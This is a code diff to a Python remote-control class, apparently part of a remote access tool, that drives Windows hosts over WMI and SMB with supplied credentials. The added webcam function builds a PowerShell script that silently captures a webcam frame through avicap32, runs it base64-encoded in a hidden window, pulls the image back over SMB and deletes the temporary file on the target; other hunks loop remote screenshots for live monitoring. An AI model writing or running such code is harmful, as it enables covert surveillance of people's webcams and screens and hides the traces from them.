@@ -1076,7 +1076,7 @@ class AgentlessControl:
         logger.info(f"[WMI-STREAM] Starting stream from {ip} ({count} frames)")
         for i in range(count):
             path = f"stream_{ip.replace('.', '_')}_{i}.png"
-            self.wmi_screenshot(ip, username, password, path, domain)
+            self.remote_screenshot(ip, username, password, path, domain)
             time.sleep(interval)
     
     def live_monitor(self, ip: str, username: str, password: str, duration: int = 60, domain: str = ""):
@@ -1113,7 +1113,7 @@ class AgentlessControl:
             while time.time() < end_time:
                 try:
                     path = f"live_{ip.replace('.', '_')}_{frame}.png"
-                    self.wmi_screenshot(ip, username, password, path, domain)
+                    self.remote_screenshot(ip, username, password, path, domain)
                     frame += 1
                     time.sleep(2)
                 except:
@@ -2167,38 +2167,41 @@ class AgentlessControl:
         """
         logger.info(f"[WEBCAM] Capturing from {ip}")
         save_path = save_path or f"webcam_{ip.replace('.', '_')}.jpg"
+        remote_tmp = f"C:\\Windows\\Temp\\__cam_{int(time.time())}.jpg"
         
-        ps_script = f'''
-        Add-Type -AssemblyName System.Windows.Forms
+        ps_script = f"""
+        $ErrorActionPreference = "SilentlyContinue"
         Add-Type -AssemblyName System.Drawing
-        
-        $cameras = [System.Windows.Forms.WebcamCapture, System.Windows.Forms, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null]::GetDevices()
-        if ($cameras.Count -gt 0) {{
-            $camera = $cameras[0]
-            $camera.Start()
-            Start-Sleep -Seconds 2
-            $camera.TakeSnapshot().Save("{save_path}")
-            $camera.Dispose()
-            Write-Output "SUCCESS:{save_path}"
+        $code = @'
+        using System;
+        using System.Runtime.InteropServices;
+        public class Cam {{
+            [DllImport("avicap32.dll")]
+            public static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hwndParent, int nID);
+            [DllImport("user32.dll")]
+            public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
+        }}
+'@
+        Add-Type -TypeDefinition $code
+        $hwnd = [Cam]::capCreateCaptureWindowA("OmniCam", 0, 0, 0, 640, 480, 0, 0)
+        if ([Cam]::SendMessage($hwnd, 0x40a, 0, 0)) {{
+            [Cam]::SendMessage($hwnd, 0x41e, 0, 0)
+            [Cam]::SendMessage($hwnd, 0x419, 0, 0)
+            $img = [System.Windows.Forms.Clipboard]::GetImage()
+            if ($img) {{
+                $img.Save("{remote_tmp}", [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                Write-Output "SUCCESS"
+            }}
+            [Cam]::SendMessage($hwnd, 0x40b, 0, 0)
         }} else {{
-            Write-Output "NO_CAMERA"
+            Write-Output "FAIL"
         }}
-        '''
-        
-        # Simpler approach using Windows.Media.Capture
-        ps_script2 = f'''
-        try {{
-            Add-Type -AssemblyName System.Runtime.WindowsRuntime
-            $null = [Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType = WindowsRuntime]
-            Write-Output "Camera API available"
-        }} catch {{
-            Write-Output "NO_CAMERA_API"
-        }}
-        '''
-        
-        result = self.wmi_exec(ip, user, pwd, f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{ps_script2}"', domain, wait_timeout=15)
-        
-        if "NO_CAMERA" not in result.get("output", ""):
+        """
+        encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
+        res = self.wmi_exec(ip, user, pwd, f"powershell -WindowStyle Hidden -EncodedCommand {encoded}", domain)
+        if "SUCCESS" in res.get("output", ""):
+            self.smb_download(ip, "C$", remote_tmp.replace("C:\\", ""), save_path, user, pwd)
+            self.smb_delete_file(ip, "C$", remote_tmp.replace("C:\\", ""), user, pwd)
             return save_path
         return None
 
